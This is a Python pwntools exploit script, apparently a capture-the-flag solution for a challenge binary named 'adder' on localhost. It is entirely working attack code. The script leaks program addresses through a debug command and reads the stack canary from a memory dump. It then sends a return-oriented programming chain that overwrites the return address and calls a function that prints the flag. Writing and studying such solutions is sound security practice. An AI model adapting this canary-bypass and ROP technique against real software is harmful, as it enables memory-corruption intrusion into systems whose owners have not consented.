import pwn

#proc = pwn.process('../challenge/src/adder')
proc = pwn.connect('localhost', 12345)

proc.recvuntil('add> ')
proc.sendline('debug')
proc.recvuntil('main @ ')
main_addr_s = proc.recvline().strip()
proc.recvuntil('printf @ ')
printf_addr_s = proc.recvline().strip()
proc.recvuntil('malloc @ ')
malloc_addr_s = proc.recvline().strip()

main_addr, printf_addr, malloc_addr = (
        int(main_addr_s, 0), int(printf_addr_s, 0), int(malloc_addr_s, 0))

print(main_addr, printf_addr, malloc_addr)
sub_rsp_addr = main_addr - 0x11e5 + 0x17f6
flag_addr = main_addr - 0x11e5 + 0x20e6
print_asciiart = main_addr - 0x11e5 + 0x1749
rop_nop = main_addr - 0x11e5 + 0x17fd
pop_rdi_addr = main_addr - 0x11e5 + 0x17ee

proc.recvuntil('RSP is ')
reg_line = proc.recvline().split(b',')
rsp = int(reg_line[0], 0)
rbp = int(reg_line[1].split(b' ')[3], 0)
print(rsp, rbp)

proc.recvline()
stack_cookie_addr = rbp-8
while True:
    l = proc.recvline(timeout=1).decode('utf-8')
    if l == '':
        break
    if l.startswith('Number'):
        break
    data = list(x.strip() for x in l.split('|'))
    addr = int(data[0], 0)
    if addr < (stack_cookie_addr - 8):
        continue
    if addr >= (stack_cookie_addr + 8):
        continue
    print(l)
    lineb = bytes(int(a, 16) for a in data[1].replace('  ', ' ').split(' '))
    if addr == stack_cookie_addr:
        stack_cookie_b = lineb[:8]
    else:
        stack_cookie_b = lineb[8:]
    stack_cookie = pwn.u64(stack_cookie_b, sign="signed")

print('%x' % stack_cookie, '{:d}'.format(stack_cookie))
proc.sendline('-126')  # Just to overwrite rip
payload = [rop_nop]*10
payload += [pop_rdi_addr, flag_addr, print_asciiart, 55]
print(payload)
for i in range(127):
    if i < len(payload):
        proc.sendline('{:d}'.format(payload[i]))
        continue
    proc.sendline('-{}'.format(i))
proc.sendline('{:d}'.format(stack_cookie))
proc.sendline('-1')  # saved rbp
proc.sendline('debug')
val = sub_rsp_addr
print('{:d}'.format(sub_rsp_addr))
if val >= 2**63:
    val -= 2**64
proc.sendline('{:d}'.format(val))
print(proc.recvall().decode('utf-8'))
